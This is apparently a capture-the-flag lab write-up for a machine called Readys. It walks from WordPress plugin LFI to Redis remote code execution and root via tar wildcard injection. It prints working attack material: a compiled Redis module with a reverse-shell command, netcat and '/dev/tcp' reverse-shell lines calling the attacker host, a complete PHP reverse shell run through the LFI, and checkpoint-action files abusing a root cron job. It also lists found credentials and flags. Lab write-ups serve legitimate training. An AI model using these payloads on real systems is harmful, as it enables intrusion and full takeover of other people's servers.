# CTF Writeup: Readys

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 22:56 EST
Nmap scan report for 192.168.130.166
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   27.10 ms 192.168.45.1
2   27.14 ms 192.168.45.254
3   27.17 ms 192.168.251.1
4   28.31 ms 192.168.130.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
```

We start of by running wpscan, since the recon scan revealed that the website is utilizing WordPress.

```
wpscan --url http://192.168.130.166      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://192.168.130.166/ [192.168.130.166]
[+] Started: Fri Dec 26 23:00:54 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.130.166/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.130.166/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.130.166/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.130.166/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.130.166/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://192.168.130.166/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.130.166/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://192.168.130.166/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://192.168.130.166/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.130.166/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.130.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.130.166/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Dec 26 23:00:59 2025
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 43.382 KB
[+] Data Received: 398.557 KB
[+] Memory used: 262.012 MB
[+] Elapsed time: 00:00:05
```

## Vulnerability Assessment

The WordPress Scan revealed an plugin called "site-editor" 1.1.1, let's perform Vulnerability Assessment in order to find possible CVE's.

```
wget https://www.exploit-db.com/raw/44340
```

Apparently the following domain is vulnerable to LFI, let's check it!

```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

It works!

```
curl http://192.168.130.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
alice:x:1000:1000::/home/alice:/bin/bash
{"success":true,"data":{"output":[]}}
```

## Initial Access

I tried to get the redis password, since we already got the username "redis". Retrieved an password in /etc/redis/redis.conf

```
redis:Ready4Redis?
```

Connected to redis-cli and authorized myself.

```
redis-cli -h 192.168.196.166                
192.168.196.166:6379> AUTH Ready4Redis?
OK
```

It worked!

We googled for Exploits for Redis and utilized the following to get Initial Access on the server! 
This Exploit works for 4.xx & 5.xx versions.

```
https://github.com/Ridter/redis-rce?tab=readme-ov-file
```

Before u can run this exploit u will need to compile an exp.so file.

Which u can get from here:

```
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

Unfortunately the module.c doesn't work, please use the following PoC:

```
#include "redismodule.h"
#include <string.h>  // For strlen, strcat
#include <arpa/inet.h>  // For inet_addr
#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 3) {
                size_t cmd_len;
                char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
                char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
                int port = atoi(port_s);
                int s;

                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(ip);
                sa.sin_port = htons(port);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                char *args[] = {"/bin/sh", NULL};
                char *env[] = {NULL};
                execve("/bin/sh", args, env);
        }
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"system",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
          if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    return REDISMODULE_OK;
}
```

And build your module.so file 

```
make
```

After that rename it to exp.so and run the exploit with the following Syntax:

```
python3 redis-rce.py -r 192.168.196.166 -p 6379 -L 192.168.45.164 -P 80 -v -f exp.so -a "Ready4Redis?"

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.196.166:6379...
[<-] b'*2\r\n$4\r\nAUTH\r\n$12\r\nReady4Redis?\r\n'
[->] b'+OK\r\n'
[*] Sending SLAVEOF command to server
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.164\r\n$2\r\n80\r\n'
[->] b'+OK\r\n'
[+] Accepted connection from 192.168.196.166:6379
[*] Setting filename
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[+] Accepted connection from 192.168.196.166:6379
[*] Start listening on 192.168.45.164:80
[*] Tring to run payload
[+] Accepted connection from 192.168.196.166:44551
[->] b'*1\r\n$4\r\nPING\r\n'
[<-] b'+PONG\r\n'
[->] b'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'
[<-] b'+OK\r\n'
[->] b'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'
[<-] b'+OK\r\n'
[->] b'*3\r\n$5\r\nPSYNC\r\n$40\r\nd8da0bfd6a0183c62e080cd6181f719af4d66b00\r\n$1\r\n1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 0\r\n$48000\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\xb4\x00\x00\x00\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b'+OK\r\n'
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$
```

The Shell seems very weak, let's get an stronger one!

Started up an listener on port 22.

```
nc -lvnp 22
```

Executed the following command on the target system.

```
nc 192.168.45.164 22 -e /bin/bash
```

Gained RCE as user "redis".

```
nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.166] 58224
whoami
redis
```

## Privilege Escalation

Performed shell hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Retrieved MySQL Database Credentials in /var/www/html/wp-config.php

```
karl:Wordpress1234
```

Accessed the MySQL Database locally and found admin:$P$Ba5uoSB5xsqZ5GFIbBnOkXA0ahSJnb0

Saved the hash on my local machine and bruteforced unsuccessfully with john the ripper.

```
john password.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Viewing the /etc/crontab file looked very promising.

```
redis@readys:/var/www/html$ cat /etc/crontab
*/3 * * * * root /usr/local/bin/backup.sh
```

Analyzing the script itself seems even more promising.

```
redis@readys:/var/www/html$ cat /usr/local/bin/backup.sh
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

We can utilize Wildcard Injection to escalate to root. But we have one big issue.
We can't write inside the /var/www/html directory. I'm assuming we will need to elevate our privs to user "alice" first. But the issue is all the passwords I found didn't work for user alice and the hash we retrieved from the mysql database couldn't be cracked.

Checked Processes which are getting ran by user "alice".

```
redis@readys:/var/www/html/wp-admin$ ps -aux | grep alice
alice      867  0.0  0.5 197708 10504 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
alice      868  0.0  0.5 197708 10504 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
alice      869  0.0  0.5 197708 10504 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
alice      870  0.0  0.5 197708 10504 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
alice      871  0.0  0.5 197708 10504 ?        S    00:00   0:00 /usr/sbin/apache2 -k start
redis     1008  0.0  0.0   6208   824 pts/0    S+   00:12   0:00 grep alice
```

This seemed rather interesting. Maybe we can get RCE as user "alice", if we add an php reverse shell into the target system somewhere? Unfortunately we don't have write access to /var/www/html. Adding it to /tmp didn't work either because we can't view the file inside the LFI Vulnerability.

Analyzed all the write access directories we got and tested them manually with the LFI which files were displayed.

```
redis@readys:/run/redis$ find / -type d -writable 2>/dev/null
/dev/mqueue
/dev/shm
/tmp
/proc/1026/task/1026/fd
/proc/1026/fd
/proc/1026/map_files
/run/redis
/opt/redis-files
/var/tmp
/var/lib/redis
/var/log/redis
```

Discovered that /opt/redis-files was able to be displayed on the webpage, since alice executes the web-root we might have an chance if we add an php-reverse-shell script.

```
curl http://192.168.196.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.txt
pwned.
{"success":true,"data":{"output":[]}}
```

Let's put the following reverse shell script inside the /opt/redis-files directory.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.45.164';  // CHANGE THIS
$port = 6379;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 




```

Downloaded the reverse shell script.

```
redis@readys://opt/redis-files$ wget http://192.168.45.164/php-reverse-shell.php
--2025-12-27 00:24:40--  http://192.168.45.164/php-reverse-shell.php
Connecting to 192.168.45.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5496 (5.4K) [application/octet-stream]
Saving to: ‘php-reverse-shell.php’

php-reverse-shell.php                               0%[                                                                                       php-reverse-shell.php                             100%[=============================================================================================================>]   5.37K  --.-KB/s    in 0.002s  

2025-12-27 00:24:40 (2.63 MB/s) - ‘php-reverse-shell.php’ saved [5496/5496]
```

Started up listener on port 6379.

```
nc -lvnp 6379
```

Utilized the LFI to execute the reverse shell script as user "alice".

```
curl http://192.168.196.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/php-reverse-shell.php
```

Gained RCE as user "alice".

```
nc -lvnp 6379
listening on [any] 6379 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.166] 56868
Linux readys 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
 00:27:22 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(alice) gid=1000(alice) groups=1000(alice)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
alice
```

Retrieved local.txt in /home/alice directory.

```
380352a9e4ee30cb03bc5e2fe7537bfb
```

Performed Shell Hardening again.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL +Z
stty raws -echo ; fg ; reset
stty columns rows 200
export TERM=xterm
```

We now have write-access to /var/www/html.

Let's start by adding checkpoint and checkpoint-exec and an reverse shell script.

```
touch ./"--checkpoint=1"
```
```
touch ./"--checkpoint-action=exec=sh shell.sh"
```

Create the following shell.sh script.

```
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.162/80 0>&1'
```

Give the script executable perms.

```
chmod +x shell.sh
```

Start up listener on local machine on port 80, since this port isn't getting blocked by firewall.


```
nc -lvnp 80
```

After some time the listener will catch an root shell, because the cronjob will unpack our shell script at first and execute the script with root permissions, since the cronjob is running on root perms.

```
nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.166] 38906
bash: cannot set terminal process group (1098): Inappropriate ioctl for device
bash: no job control in this shell
root@readys:/var/www/html#
```

Retrieved proof.txt in /root directory.

```
f0605f45b4b3007974c3a268267046da
```
